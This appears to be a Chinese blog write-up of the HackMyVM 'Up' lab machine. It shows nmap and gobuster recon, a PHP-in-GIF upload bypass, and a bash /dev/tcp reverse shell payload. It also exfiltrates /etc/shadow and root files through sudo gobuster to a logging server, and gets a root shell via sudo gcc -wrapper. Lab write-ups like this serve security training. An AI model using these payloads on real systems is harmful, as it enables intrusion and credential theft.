---
title: HackMyVM-Up
published: 2025-03-09 16:23:40
tags: [HackMyVM]
category: 靶机
draft: false
---

# Up.

> https://hackmyvm.eu/machines/machine.php?vm=Up
> 

Notes: **Enjoy.**

## 前期踩点

`31`是靶机

```bash
⚡ root@kali  ~  nmap -sP 192.168.56.0/24                   
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-17 01:17 EST
Nmap scan report for 192.168.56.1
Host is up (0.00034s latency).
MAC Address: 0A:00:27:00:00:09 (Unknown)
Nmap scan report for 192.168.56.2
Host is up (0.00028s latency).
MAC Address: 08:00:27:44:BF:0B (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.31
Host is up (0.00051s latency).
MAC Address: 08:00:27:1E:60:21 (Oracle VirtualBox virtual NIC)
```

```bash
⚡ root@kali  ~  nmap -sT -min-rate 10000 -p- 192.168.56.31  
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-17 01:18 EST
Nmap scan report for 192.168.56.31
Host is up (0.00085s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 08:00:27:1E:60:21 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 17.22 seconds
```

这次`UDP`竟然扫出来东西了，`mDNS`（Multicast DNS）的默认端口，通常用于 DNS 服务发现

```bash
⚡ root@kali  ~  nmap -sU -min-rate 10000 -p- 192.168.56.31 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-17 01:19 EST
Warning: 192.168.56.31 giving up on port because retransmission cap hit (10).
Nmap scan report for 192.168.56.31
Host is up (0.00090s latency).
Not shown: 65456 open|filtered udp ports (no-response), 78 closed udp ports (port-unreach)
PORT     STATE SERVICE
5353/udp open  zeroconf
MAC Address: 08:00:27:1E:60:21 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 86.07 seconds
```

```bash
⚡ root@kali  ~  nmap -sT -A -T4 -O -p 80 192.168.56.31 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-17 01:21 EST
Nmap scan report for 192.168.56.31
Host is up (0.00060s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: RodGar - Subir Imagen
MAC Address: 08:00:27:1E:60:21 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.60 ms 192.168.56.31

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.56 seconds
```

可以看到目标主机还报告了 **`80/tcp`** 上有 `HTTP` 服务

```bash
⚡ root@kali  ~  nmap -sU -A -T4 -O -p 5353 192.168.56.31
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-17 01:22 EST
Nmap scan report for 192.168.56.31
Host is up (0.00069s latency).

PORT     STATE SERVICE VERSION
5353/udp open  mdns    DNS-based service discovery
| dns-service-discovery: 
|   80/tcp http
|_    Address=192.168.56.31 fe80::a00:27ff:fe1e:6021
MAC Address: 08:00:27:1E:60:21 (Oracle VirtualBox virtual NIC)
Too many fingerprints match this host to give specific OS details
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.69 ms 192.168.56.31

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.35 seconds
```

`nmap`漏洞扫描，扫描出了`file-upload`

```bash
⚡ root@kali  ~  nmap -script=vuln -p 80 192.168.56.31 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-17 01:23 EST
Nmap scan report for 192.168.56.31
Host is up (0.00034s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-fileupload-exploiter: 
|   
|_    Failed to upload and execute a payload.
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.56.31
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://192.168.56.31:80/
|     Form id: file-upload
|_    Form action: 
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
MAC Address: 08:00:27:1E:60:21 (Oracle VirtualBox virtual NIC)
```

访问`http`服务，并检测指纹信息，主页貌似是文件上传功能点

![image.png](image%20105.png)

## 文件上传漏洞检测

正常上传照片正常上传的，但是响应包没给出上传路径

![image.png](image%20106.png)

前端有文件后缀限制

```bash
<input id="file-upload" type="file" name="image" accept=".jpg, .jpeg, .gif" required>
```

先扫一下目录

```bash
⚡ root@kali  ~  gobuster dir -u 192.168.56.31 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,zip,txt,html -b 403,404,502    
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.31
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   403,404,502
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,zip,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 4489]
/uploads              (Status: 301) [Size: 316] [--> http://192.168.56.31/uploads/]
/javascript           (Status: 301) [Size: 319] [--> http://192.168.56.31/javascript/]
```

能扫描到`uploads`文件夹，很可能是文件上传的地方，访问一下

![image.png](image%20107.png)

给了一句话，翻译过来就是：`记住，列出所有事项始终是一个好的做法。`

不明所以，再给你爆一次

```
⚡ root@kali  ~  gobuster dir -u 192.168.56.31/uploads -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,zip,txt,html -b 403,404,502
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.31/uploads
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404,502,403
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,zip,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/robots.txt           (Status: 200) [Size: 1301]
/clue.txt             (Status: 200) [Size: 17]
Progress: 1038215 / 1038220 (100.00%)
===============================================================
Finished
===============================================================
```

扫出来两个文件`/robots.txt` `/clue.txt`

`/robots.txt` 像一串`base64` 编码后的字符

![image.png](image%20108.png)

解码，是上传源码，使用`php`写的

```bash
<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $targetDir = "uploads/";
    $fileName = basename($_FILES["image"]["name"]);
    $fileType = pathinfo($fileName, PATHINFO_EXTENSION);
    $fileBaseName = pathinfo($fileName, PATHINFO_FILENAME);

    $allowedTypes = ['jpg', 'jpeg', 'gif'];
    if (in_array(strtolower($fileType), $allowedTypes)) {
        $encryptedFileName = strtr($fileBaseName, 
            'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz', 
            'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm');

        $newFileName = $encryptedFileName . "." . $fileType;
        $targetFilePath = $targetDir . $newFileName;

        if (move_uploaded_file($_FILES["image"]["tmp_name"], $targetFilePath)) {
            $message = "El archivo se ha subido correctamente.";
        } else {
            $message = "Hubo un error al subir el archivo.";
        }
    } else {
        $message = "Solo se permiten archivos JPG y GIF.";
    }
}
?>
```

`/clue.txt` 给了条路径，不过访问不到，可能到提权的部分有用

![image.png](image%20109.png)

拿到源码后分析一下，白名单限制设置允许上传的文件类型为 `jpg`、`jpeg` 和 `gif` 

文件上传之后对文件名进行字符替换，上传到`uploads`文件夹

```bash
$encryptedFileName = strtr($fileBaseName, 
    'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz', 
    'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm');
```

我们上传`a.gif`，根据字符替换后就变成了`n.gif` ,访问`n.gif`

![image.png](image%20110.png)

成功访问到了，我们再上传一次，抓包修改抓包内容。添加`phpinfo()`语句

![image.png](image%20111.png)

再次访问`n.gif` ,`phpinfo()`成功执行了，一般来说白名单绕过只能配合解析漏洞来绕过，但是这里直接执行成功了，估计是服务器配置不当导致的

![image.png](image%20112.png)

## 提权

将其替换为提权语句，`kali`开启监听，上传

```bash
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'");?>
```

![image.png](image%20113.png)

然后访问`n.gif` ，获得`shell`

```bash
⚡ root@kali  ~  nc -lvp 4444                         
listening on [any] 4444 ...
id
192.168.56.31: inverse host lookup failed: Host name lookup failure
connect to [192.168.56.4] from (UNKNOWN) [192.168.56.31] 50214
bash: cannot set terminal process group (739): Inappropriate ioctl for device
bash: no job control in this shell
www-data@debian:/var/www/html/uploads$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@debian:/var/www/html/uploads$ 
```

在`rodgar`用户家目录可以找到`UserFlag`

```bash
www-data@debian:/home/rodgar$ cat user.txt
b45cffe084dd3d20d928bee
```

查看权限可以`root`权限执行`gobuster`

```bash
www-data@debian:/home/rodgar$ sudo -l
sudo -l
Matching Defaults entries for www-data on debian:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User www-data may run the following commands on debian:
    (ALL) NOPASSWD: /usr/bin/gobuster
```

那么就可以任意读取文件了，首先在`kali`使用`python`写一个简易服务器，将所有请求都保存在`access.txt`里

```bash
// a.py
from flask import Flask, Response, request

app = Flask(__name__)

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
# catch_all 处理所有请求
def catch_all(path):
    # 获取请求的 URL 和路径
    url = request.url
    path_info = path
    
    # 将 URL 和路径保存到 access.txt
    with open('access.txt', 'a') as f:
        f.write(f"URL: {url}\n")
        f.write(f"Path: {path_info}\n")
        f.write("-" * 50 + "\n")

    # 根据路径的长度返回相应的状态码
    if len(path) == 31:
        return Response(status=404)
    else:
        return Response(status=200)

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=81)
```

`kali`开启服务器

```bash
python a.py
```

然后在靶机使用`gobuster`指定字典`/etc/shadow` ,执行

```bash
sudo gobuster dir -u http://192.168.56.4:81 -w /etc/shadow --exclude-length 0
```

那么这样就能读取到`/etc/shadow`的文件夹了

![image.png](image%20114.png)

接着尝试读取`/root/root.txt`文件

```bash
www-data@debian:/var/www/html/uploads$ sudo gobuster dir -u http://192.168.56.4:81 -w /root/root.txt --exclude-length 0
<92.168.56.4:81 -w /root/root.txt --exclude-length 0
Error: error on parsing arguments: wordlist file "/root/root.txt" does not exist: stat /root/root.txt: no such file or directory
```

但是提示找不到该文件，想起来上面`web`的`/clue.txt` 给了条路经`/root/rodgarpass` 

我们将其作为字典再来一次

![image.png](image%20115.png)

```bash
b45cffe084dd3d20d928bee85e7b0f2
```

进行`su`切换，发现认证错误，而且密码看着像是`MD5` ,进行`MD5`爆破

![image.png](image%20116.png)

解出来为`string` ,再次`su` ，没登陆进去，经提示是作者疏忽`?`将`MD5`值最后少了个`1` （怪不得`john`无法破解）

```bash
b45cffe084dd3d20d928bee85e7b0f21
```

再次切换

```bash
www-data@debian:/home/rodgar$ su rodgar 
su rodgar
Password: b45cffe084dd3d20d928bee85e7b0f21
id
uid=1001(rodgar) gid=1001(rodgar) grupos=1001(rodgar)
```

查看权限，欸嘿，可以直接提权了

```bash
sudo -l
Matching Defaults entries for rodgar on debian:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User rodgar may run the following commands on debian:
    (ALL : ALL) NOPASSWD: /usr/bin/gcc, /usr/bin/make
```

![image.png](image%20117.png)

```bash
sudo gcc -wrapper /bin/sh,-s .
id
uid=0(root) gid=0(root) grupos=0(root)
```

读取`RootFlag` ，`root`.txt文件被改为了`rooo_-tt.txt`

```bash
cat rooo_-tt.txt
44b3f261e197124e60217d6ffe7e71a8e0175ae0
```